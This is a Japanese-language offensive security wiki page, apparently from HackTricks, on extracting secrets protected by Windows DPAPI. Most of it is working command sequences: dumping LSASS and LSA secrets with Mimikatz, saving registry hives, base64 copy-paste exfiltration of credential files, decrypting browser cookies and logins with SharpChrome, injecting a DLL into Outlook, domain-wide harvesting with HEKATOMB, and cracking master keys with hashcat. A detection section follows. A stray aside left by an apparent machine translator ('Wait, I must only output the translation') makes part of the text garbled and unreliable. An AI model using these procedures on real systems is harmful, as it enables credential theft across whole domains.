# DPAPI - パスワードの抽出

{{#include ../../banners/hacktricks-training.md}}



## DPAPIとは

The Data Protection API (DPAPI) は、主に Windows オペレーティングシステム内で、**非対称秘密鍵の対称暗号化**に使用され、ユーザーまたはシステムのシークレットを主要なエントロピー源として利用します。これにより、開発者はユーザーのログオンシークレット（またはシステム暗号化の場合はシステムのドメイン認証シークレット）から派生したキーでデータを暗号化でき、暗号キーの保護を開発者自身で管理する必要がなくなります。

DPAPI の最も一般的な利用方法は **`CryptProtectData` と `CryptUnprotectData`** 関数を使うことで、これらは現在ログオンしているプロセスのセッションを用いてアプリケーションがデータを安全に暗号化／復号できるようにします。つまり、暗号化されたデータはそれを暗号化したのと同じユーザーまたはシステムだけが復号可能です。

さらに、これらの関数は暗号化と復号の際に使用される **`entropy` パラメータ** も受け取り、このパラメータで暗号化されたものを復号するには、暗号化時に使用されたのと同じ entropy 値を渡す必要があります。

### ユーザーキーの生成

DPAPI は各ユーザーごとに資格情報に基づいて一意のキー（**`pre-key`** と呼ばれる）を生成します。このキーはユーザーのパスワードなどから派生し、アルゴリズムはユーザーの種類によって異なりますが最終的に SHA1 になります。例えばドメインユーザーの場合は、**ユーザーの NTLM ハッシュに依存します**。

これは特に重要で、攻撃者がユーザーのパスワードハッシュを取得できれば、以下が可能になります:

- **そのユーザーのキーを使って DPAPI で暗号化された任意のデータを、API に問い合わせることなく復号する**
- オフラインで有効な DPAPI キーを生成しようと試みて、**パスワードをクラックする**

また、ユーザーが DPAPI を使ってデータを暗号化するたびに新しい **master key** が生成されます。この master key が実際にデータを暗号化するために使われます。各 master key にはそれを識別する **GUID**（Globally Unique Identifier）が付与されます。

master keys は **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** に保存され、ここで `{SID}` はそのユーザーの Security Identifier です。master key はユーザーの **`pre-key`** によって暗号化されて保存され、リカバリ用に **domain backup key** によっても暗号化されて保存されます（同じキーが2通りの方法で暗号化されて保存されます）。

注意: **master key を暗号化するために使われる domain key はドメインコントローラ上にあり、変わることはありません**。したがって攻撃者がドメインコントローラにアクセスできれば、domain backup key を取得してドメイン内のすべてのユーザーの master key を復号できます。

暗号化された blob はヘッダ内に、データを暗号化するのに使われた **master key の GUID** を含んでいます。

> [!TIP]
> DPAPI 暗号化 blob は **`01 00 00 00`** で始まります

マスターキーを探す:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### マシン/システムキーの生成

これはマシンがデータを暗号化するために使用するキーです。これは、**DPAPI_SYSTEM LSA secret** に基づいており、SYSTEM ユーザーのみがアクセスできる特別なキーです。このキーは、マシンレベルの資格情報やシステム全体のシークレットなど、システム自身がアクセスする必要のあるデータを暗号化するために使用されます。

これらのキーは **ドメインバックアップを持たない** ため、ローカルでしかアクセスできません:

- **Mimikatz** は `mimikatz lsadump::secrets` コマンドで LSA secrets をダンプしてアクセスできます
- シークレットはレジストリに格納されているため、管理者はアクセスするために **DACL の権限を変更する** ことができます。レジストリのパスは: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- レジストリハイブからのオフライン抽出も可能です。例えば、対象上の管理者としてハイブを保存し、exfiltrate them:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
その後、analysis box 上で hives から DPAPI_SYSTEM LSA secret を回復し、それを使って machine-scope blobs（scheduled task passwords、service credentials、Wi‑Fi profiles など）を復号化します:
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### DPAPI によって保護されるデータ

Among the personal data protected by DPAPI are:

- Windows creds
- Internet Explorer と Google Chrome のパスワードおよび自動入力データ
- Outlook や Windows Mail のようなアプリケーションで使用される電子メールおよび内部 FTP アカウントのパスワード
- 共有フォルダ、リソース、無線ネットワーク、Windows Vault のパスワード（暗号化キーを含む）
- リモートデスクトップ接続、.NET Passport、および各種暗号化・認証用途のための秘密鍵
- Credential Manager によって管理されるネットワークパスワードや、CryptProtectData を使用するアプリケーション（Skype、MSN messenger 等）の個人データ
- レジストリ内の暗号化された blob
- ...

System protected data includes:
- Wifi パスワード
- スケジュールされたタスクのパスワード
- ...

### マスターキー抽出のオプション

- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- ローカル管理者権限があれば、**LSASS のメモリにアクセス**して、接続中のすべてのユーザーの DPAPI マスターキーと SYSTEM キーを抽出できます。
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- ユーザーがローカル管理者権限を持っている場合、**DPAPI_SYSTEM LSA secret** にアクセスしてマシンのマスターキーを復号できます:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- ユーザーのパスワードまたは hash NTLM が判明している場合、ユーザーの **マスターキーを直接復号できます**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- ユーザーとしてセッション内にいる場合、DCに対して**backup key to decrypt the master keys using RPC**を要求することが可能です。local adminでユーザーがログオンしている場合、これのために**steal his session token**することができます:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## ボールトの一覧
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI 暗号化データにアクセスする

### DPAPI 暗号化データを見つける

一般ユーザーの **保護されたファイル** は以下にあります:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- 上記パスで `\Roaming\` を `\Local\` に変更することも確認してください。

列挙の例:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) はファイルシステム、レジストリ、B64 blobs の中から DPAPI 暗号化された blobs を検出できます:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
同じリポジトリの[**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)は、DPAPIを使ってクッキーなどの機密データを復号するために使用できます。

#### Chromium/Edge/Electron クイックレシピ (SharpChrome)

- Current user — 保存されたログイン情報/クッキーの対話的復号（Chrome 127+ の app-bound cookies でも動作します。追加キーはユーザーコンテキストで実行した際にユーザーの Credential Manager から解決されるため）:
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- ファイルしかない場合のオフライン解析。まずプロファイルの "Local State" から AES state key を抽出し、それを使って cookie DB を復号します:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Domain-wide/remote triage — DPAPI domain backup key (PVK) とターゲットホスト上の admin を持っている場合:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- ユーザーの DPAPI prekey/credkey (LSASS から) を持っている場合、password cracking を省略してプロファイルデータを直接復号できます:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
注意事項
- 新しい Chrome/Edge のビルドでは、特定の cookies を "App-Bound" 暗号化で保存する場合があります。追加の app-bound key がないと、それらの特定の cookies をオフラインで復号することはできません。SharpChrome をターゲットユーザのコンテキストで実行すると自動的に取得されます。詳細は下記の Chrome セキュリティブログ記事を参照してください。

### アクセスキーとデータ

- **SharpDPAPI を使用して**現在のセッションの DPAPI 暗号化ファイルから資格情報を取得します:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **認証情報の詳細を取得する**（暗号化されたデータや guidMasterKey のような）.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

RPC を使用して、**domain backup key** を要求するユーザーの masterkey を復号化する:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
**SharpDPAPI** ツールは、マスターキーの復号のために次の引数もサポートしています（`/rpc` を使ってドメインのバックアップキーを取得したり、`/password` で平文のパスワードを使用したり、`/pvk` で DPAPI ドメインのプライベートキー ファイルを指定したりできる点に注意してください...）：
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **マスターキーを使用してデータを復号化する**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** tool also supports these arguments for `credentials|vaults|rdg|keepass|triage|blob|ps` decryption (note how it's possible to use `/rpc` to get the domains backup key, `/password` to use a plaintext password, `/pvk` to specify a DPAPI domain private key file, `/unprotect` to use current users session...):

--> Wait, I must only output the translation. I accidentally included the original line. Need to correct.
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- DPAPI prekey/credkey を直接使用する（password 不要）

もし dump LSASS できるなら、Mimikatz はログオンごとの DPAPI key を露出することが多く、平文の password を知らなくてもユーザーの masterkeys を復号するために使えます。 この値をツールに直接渡してください:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- **現在のユーザーセッション** を使用していくつかのデータを復号する:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Impacket dpapi.py を使用したオフライン復号

被害者ユーザーのSIDとパスワード（またはNT hash）を持っている場合、Impacket dpapi.py を使用して DPAPI masterkeys と Credential Manager blobs を完全にオフラインで復号できます。

- ディスク上のアーティファクトを特定する:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- ファイル転送ツールが不安定な場合は、ホスト上でファイルをbase64エンコードして出力をコピーする：
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- ユーザーの SID と password/hash を使って masterkey を復号する:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- 復号済みの masterkey を使用して credential blob を復号する:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
このワークフローは、Windows Credential Manager を使用するアプリが保存したドメイン資格情報（例: `*_adm` のような管理者アカウント）を回収することがよくあります。

---

### オプションのエントロピーの処理（"Third-party entropy"）

一部のアプリケーションは、`CryptProtectData` に追加の **entropy** 値を渡します。 この値がないと、正しい masterkey が分かっていても blob を復号できません。したがって、この方法で保護された資格情報（例: Microsoft Outlook、いくつかの VPN クライアント）を対象とする場合は、entropy を取得することが不可欠です。

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) は、ターゲットプロセス内の DPAPI 関数にフックを仕掛け、提供された任意の entropy を透過的に記録する user-mode DLL です。outlook.exe や vpnclient.exe のようなプロセスに対して EntropyCapture を **DLL-injection** モードで実行すると、各 entropy バッファを呼び出したプロセスと blob にマップしたファイルが出力されます。取得した entropy は後で **SharpDPAPI** (`/entropy:`) や **Mimikatz** (`/entropy:<file>`) に渡してデータを復号できます。
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

MicrosoftはWindows 10 v1607 (2016) から**context 3**マスターキー形式を導入しました。`hashcat` v6.2.6 (December 2023) はハッシュモード **22100** (DPAPI masterkey v1 context ), **22101** (context 1) および **22102** (context 3) を追加し、マスターキー ファイルから直接ユーザーのパスワードをGPUで高速にクラックできるようになりました。したがって、攻撃者はターゲットシステムと対話することなく、word-listやbrute-force攻撃を実行できます。

`DPAPISnoop` (2024) がこのプロセスを自動化します:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
このツールは Credential と Vault の blobs を解析し、cracked keys で復号して cleartext passwords をエクスポートすることもできます。


### 他のマシンのデータにアクセス

In **SharpDPAPI and SharpChrome** では、リモートマシンのデータにアクセスするために **`/server:HOST`** オプションを指定できます。もちろん、そのマシンにアクセスできる必要があります。以下の例では **domain backup encryption key is known** と仮定しています：
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## その他のツール

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は、LDAPディレクトリからすべてのユーザーとコンピュータを抽出し、RPC経由でドメインコントローラのバックアップキーを抽出する処理を自動化するツールです。スクリプトは抽出した各コンピュータのIPアドレスを解決し、すべてのコンピュータに対して smbclient を実行して各ユーザーのDPAPI blobを取得し、ドメインバックアップキーで全てを復号します。

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAPから抽出したコンピュータ一覧があれば、知らなかったサブネットも含めてすべて見つけることができます！

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) はDPAPIで保護されたシークレットを自動でダンプできます。2.xリリースで導入された機能：

* 数百のホストからの blob の並列収集
* **context 3** masterkeys の解析と Hashcat による自動クラッキング連携
* Chrome "App-Bound" 暗号化クッキーのサポート（次節参照）
* エンドポイントを繰り返しポーリングして新規作成された blob を差分検出する新しい **`--snapshot`** モード

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) は masterkey/credential/vault ファイルを解析する C# パーサーで、Hashcat/JtR 形式を出力でき、必要に応じて自動でクラッキングを呼び出すことができます。Windows 11 24H1 までの machine と user の masterkey フォーマットを完全にサポートします。


## 一般的な検知

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` およびその他の DPAPI 関連ディレクトリへのアクセス。
- 特に **C$** や **ADMIN$** のようなネットワーク共有経由でのアクセス。
- **Mimikatz**、**SharpDPAPI** または同様のツールを使用して LSASS メモリにアクセスしたり masterkeys をダンプしたりする行為。
- イベント **4662**: *An operation was performed on an object* — **`BCKUPKEY`** オブジェクトへのアクセスと相関させることができます。
- イベント **4673/4674**：プロセスが *SeTrustedCredManAccessPrivilege*（Credential Manager）を要求した場合

---
### 2023–2025 の脆弱性とエコシステムの変化

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023年11月）。ネットワークアクセスを持つ攻撃者がドメインメンバを騙して悪意あるDPAPIバックアップキーを取得させ、ユーザのmasterkeysを復号できる可能性がありました。2023年11月の累積更新で修正済み — 管理者は DC とワークステーションが完全にパッチ適用されていることを確認してください。
* **Chrome 127 “App-Bound” cookie encryption**（2024年7月）は従来の DPAPI のみの保護に代わり、ユーザの **Credential Manager** に格納された追加キーを導入しました。クッキーのオフライン復号には現在、DPAPI masterkey と **GCM-wrapped app-bound key** の両方が必要です。SharpChrome v2.3 および DonPAPI 2.x はユーザコンテキストで実行することで追加キーを回復可能です。


### ケーススタディ: Zscaler Client Connector – SIDから導出されるカスタムエントロピー

Zscaler Client Connector は `C:\ProgramData\Zscaler` 以下に複数の設定ファイル（例: `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`）を格納します。各ファイルは **DPAPI (Machine scope)** で暗号化されますが、ベンダはディスクに保存するのではなく *実行時に計算される* **custom entropy** を提供します。

エントロピーは次の2つの要素から再構築されます：

1. `ZSACredentialProvider.dll` に埋め込まれたハードコードされたシークレット。
2. 設定が属する Windows アカウントの **SID**。

DLL によって実装されているアルゴリズムは次と等価です：
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
秘密がディスクから読み取れるDLLに埋め込まれているため、**SYSTEM権限を持つ任意のローカル攻撃者は任意のSIDのエントロピーを再生成し**、オフラインでブロブを復号できます:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
復号すると、すべての **device posture check** とその期待値を含む完全な JSON 設定が得られます — これはクライアント側のバイパスを試みる際に非常に有用な情報です。

> TIP: 他の暗号化されたアーティファクト（`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`）はDPAPI **without** entropy（`16` zero bytes）で保護されています。したがって、SYSTEM 権限を取得すれば `ProtectedData.Unprotect` で直接復号できます。

## 参考資料

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)
- [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
